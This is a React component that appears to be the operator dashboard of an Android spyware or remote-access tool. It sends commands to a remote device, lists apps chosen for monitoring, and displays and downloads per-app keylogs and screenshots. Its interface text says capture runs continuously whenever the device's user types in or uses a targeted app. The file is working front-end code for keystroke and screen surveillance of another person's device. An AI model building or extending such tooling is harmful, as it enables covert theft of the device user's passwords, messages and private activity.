import React, { useState, useEffect, useRef, useCallback } from 'react';

export default function AppMonitorTab({ device, sendCommand, results }) {
  const deviceId = device.deviceId;
  const isOnline = device.isOnline;

  const [monitoredApps, setMonitoredApps] = useState([]);
  const [selectedApp, setSelectedApp]     = useState(null);
  const [view, setView]                   = useState('keylogs'); // 'keylogs' | 'screenshots'
  const [appKeylogs, setAppKeylogs]       = useState([]);
  const [appScreenshots, setAppScreenshots] = useState([]);
  const [keylogFiles, setKeylogFiles]     = useState([]);
  const [loadingScreenshot, setLoadingScreenshot] = useState(null);
  const [previewImage, setPreviewImage]   = useState(null);
  const seenIds = useRef(new Set());

  const fetchMonitoredApps = useCallback(() => {
    sendCommand(deviceId, 'list_app_monitor_apps', {});
  }, [deviceId, sendCommand]);

  useEffect(() => {
    if (isOnline) fetchMonitoredApps();
  }, [isOnline, fetchMonitoredApps]);

  useEffect(() => {
    results.forEach(r => {
      if (seenIds.current.has(r.id)) return;
      if (!r.success || !r.response) return;
      seenIds.current.add(r.id);
      try {
        const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
        switch (r.command) {
          case 'list_app_monitor_apps': {
            const configured = data.configured || [];
            const stored = data.stored || [];
            // Merge configured + stored
            const merged = [...configured];
            stored.forEach(s => {
              if (!merged.find(c => c.packageName === s.packageName)) {
                merged.push({ ...s, configured: false });
              } else {
                const idx = merged.findIndex(c => c.packageName === s.packageName);
                merged[idx] = { ...merged[idx], ...s };
              }
            });
            setMonitoredApps(merged);
            break;
          }
          case 'get_app_keylogs': {
            setAppKeylogs(data.logs || []);
            break;
          }
          case 'list_app_keylog_files': {
            setKeylogFiles(data.files || []);
            break;
          }
          case 'list_app_screenshots': {
            setAppScreenshots(data.screenshots || []);
            break;
          }
          case 'download_app_screenshot': {
            if (data.base64) {
              setPreviewImage({ base64: data.base64, filename: data.filename, pkg: data.packageName });
              setLoadingScreenshot(null);
            }
            break;
          }
          case 'download_app_keylog_file': {
            if (data.base64) {
              const raw = atob(data.base64);
              const blob = new Blob([raw], { type: 'text/plain' });
              const url = URL.createObjectURL(blob);
              const a = document.createElement('a');
              a.href = url;
              a.download = `${data.packageName}_${data.date}.txt`;
              a.click();
              URL.revokeObjectURL(url);
            }
            break;
          }
          default: break;
        }
      } catch (_) {}
    });
  }, [results]);

  const selectApp = (pkg) => {
    setSelectedApp(pkg);
    setAppKeylogs([]);
    setAppScreenshots([]);
    setKeylogFiles([]);
    sendCommand(deviceId, 'get_app_keylogs', { packageName: pkg, limit: 200 });
    sendCommand(deviceId, 'list_app_keylog_files', { packageName: pkg });
    sendCommand(deviceId, 'list_app_screenshots', { packageName: pkg });
  };

  const downloadKeylogFile = (pkg, date) => {
    sendCommand(deviceId, 'download_app_keylog_file', { packageName: pkg, date });
  };

  const viewScreenshot = (pkg, filename) => {
    setLoadingScreenshot(filename);
    sendCommand(deviceId, 'download_app_screenshot', { packageName: pkg, filename });
  };

  const downloadPreviewImage = () => {
    if (!previewImage) return;
    const a = document.createElement('a');
    a.href = 'data:image/jpeg;base64,' + previewImage.base64;
    a.download = previewImage.filename || 'screenshot.jpg';
    a.click();
  };

  const getAppShortName = (pkg) => pkg?.split('.').pop() || pkg;

  return (
    <div className="app-monitor-tab">
      <div className="amt-layout">
        <div className="amt-sidebar">
          <div className="amt-sidebar-header">
            <span>📡 Monitored Apps</span>
            <button className="kl-btn" onClick={fetchMonitoredApps} disabled={!isOnline}>↻</button>
          </div>
          {monitoredApps.length === 0 && (
            <div className="amt-empty">
              <div style={{ fontSize: 28 }}>📡</div>
              <div style={{ fontSize: 12 }}>No monitored apps</div>
              <div style={{ fontSize: 11, color: '#475569' }}>Add packages to Constants.java</div>
            </div>
          )}
          {monitoredApps.map(app => (
            <div
              key={app.packageName}
              className={`amt-app-item ${selectedApp === app.packageName ? 'active' : ''}`}
              onClick={() => selectApp(app.packageName)}
            >
              <div className="amt-app-name">{getAppShortName(app.packageName)}</div>
              <div className="amt-app-pkg">{app.packageName}</div>
              <div className="amt-app-stats">
                {app.keylogDays > 0 && <span className="amt-badge">{app.keylogDays}d logs</span>}
                {app.screenshots > 0 && <span className="amt-badge amt-badge-ss">{app.screenshots} ss</span>}
                {!app.installed && <span className="amt-badge amt-badge-warn">not installed</span>}
              </div>
            </div>
          ))}
        </div>

        <div className="amt-main">
          {!selectedApp ? (
            <div className="amt-no-selection">
              <div style={{ fontSize: 48 }}>📡</div>
              <div style={{ fontSize: 16, color: '#94a3b8', marginTop: 12 }}>
                Select an app to view monitoring data
              </div>
              <div style={{ fontSize: 13, color: '#475569', marginTop: 8 }}>
                Monitoring runs continuously, even when offline
              </div>
            </div>
          ) : (
            <>
              <div className="amt-app-header">
                <div className="amt-app-title">
                  <span style={{ fontSize: 20 }}>📱</span>
                  <span>{selectedApp}</span>
                </div>
                <div className="amt-view-tabs">
                  <button
                    className={`amt-vtab ${view === 'keylogs' ? 'active' : ''}`}
                    onClick={() => setView('keylogs')}
                  >
                    ⌨️ Keylogs
                  </button>
                  <button
                    className={`amt-vtab ${view === 'screenshots' ? 'active' : ''}`}
                    onClick={() => setView('screenshots')}
                  >
                    📸 Screenshots
                  </button>
                  <button
                    className={`amt-vtab ${view === 'files' ? 'active' : ''}`}
                    onClick={() => { setView('files'); sendCommand(deviceId, 'list_app_keylog_files', { packageName: selectedApp }); }}
                  >
                    📁 Files
                  </button>
                </div>
              </div>

              {view === 'keylogs' && (
                <div className="amt-keylogs">
                  <div className="amt-kl-count">{appKeylogs.length} entries</div>
                  <div className="amt-kl-feed">
                    {appKeylogs.length === 0 && (
                      <div className="amt-empty">
                        <div>No keylogs for {selectedApp}</div>
                        <div style={{ fontSize: 12, color: '#475569' }}>Logs are captured when the user types in this app</div>
                      </div>
                    )}
                    {appKeylogs.map((entry, i) => (
                      <div key={i} className="amt-kl-entry">
                        <div className="amt-kl-ts">{entry.timestamp?.slice(0, 19)}</div>
                        <div className="amt-kl-text">{entry.text}</div>
                        <div className="amt-kl-type">{entry.eventType}</div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {view === 'screenshots' && (
                <div className="amt-screenshots">
                  {appScreenshots.length === 0 && (
                    <div className="amt-empty">
                      <div style={{ fontSize: 36 }}>📸</div>
                      <div>No screenshots for {selectedApp}</div>
                      <div style={{ fontSize: 12, color: '#475569' }}>Screenshots captured when this app is active</div>
                    </div>
                  )}
                  <div className="amt-ss-grid">
                    {appScreenshots.map(ss => (
                      <div key={ss.filename} className="amt-ss-item">
                        <div
                          className="amt-ss-thumb"
                          onClick={() => viewScreenshot(selectedApp, ss.filename)}
                          style={{ cursor: 'pointer' }}
                        >
                          {loadingScreenshot === ss.filename ? (
                            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100%', color: '#7c3aed' }}>
                              Loading…
                            </div>
                          ) : (
                            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100%', fontSize: 32 }}>
                              📸
                            </div>
                          )}
                        </div>
                        <div className="amt-ss-meta">
                          <div style={{ fontSize: 11, color: '#94a3b8' }}>{ss.timestamp?.replace('_', ' ')}</div>
                          <div style={{ fontSize: 11, color: '#64748b' }}>{ss.size ? (ss.size / 1024).toFixed(0) + ' KB' : ''}</div>
                        </div>
                        <button
                          className="amt-ss-view-btn"
                          onClick={() => viewScreenshot(selectedApp, ss.filename)}
                          disabled={!isOnline}
                        >
                          👁 View
                        </button>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {view === 'files' && (
                <div className="amt-files">
                  <div className="amt-files-header">Keylog files for {selectedApp}</div>
                  {keylogFiles.length === 0 && (
                    <div className="amt-empty">No keylog files stored for this app</div>
                  )}
                  {keylogFiles.map(f => (
                    <div key={f.date} className="kl-file-item">
                      <div className="kl-file-icon">📄</div>
                      <div className="kl-file-info">
                        <div className="kl-file-date">{f.date}</div>
                        <div className="kl-file-size">{f.size ? (f.size / 1024).toFixed(1) + ' KB' : '—'}</div>
                      </div>
                      <button
                        className="kl-btn kl-btn-dl"
                        onClick={() => downloadKeylogFile(selectedApp, f.date)}
                        disabled={!isOnline}
                      >
                        ⬇ Download
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </>
          )}
        </div>
      </div>

      {previewImage && (
        <div className="modal-overlay" onClick={() => setPreviewImage(null)}>
          <div className="modal-box" style={{ maxWidth: 500, maxHeight: '90vh' }} onClick={e => e.stopPropagation()}>
            <div className="modal-title">📸 {previewImage.filename}</div>
            <img
              src={`data:image/jpeg;base64,${previewImage.base64}`}
              alt="screenshot"
              style={{ maxWidth: '100%', maxHeight: '70vh', borderRadius: 8, display: 'block', margin: '10px auto' }}
            />
            <div className="modal-actions">
              <button className="btn-secondary" onClick={() => setPreviewImage(null)}>Close</button>
              <button className="btn-primary" onClick={downloadPreviewImage}>⬇ Download</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
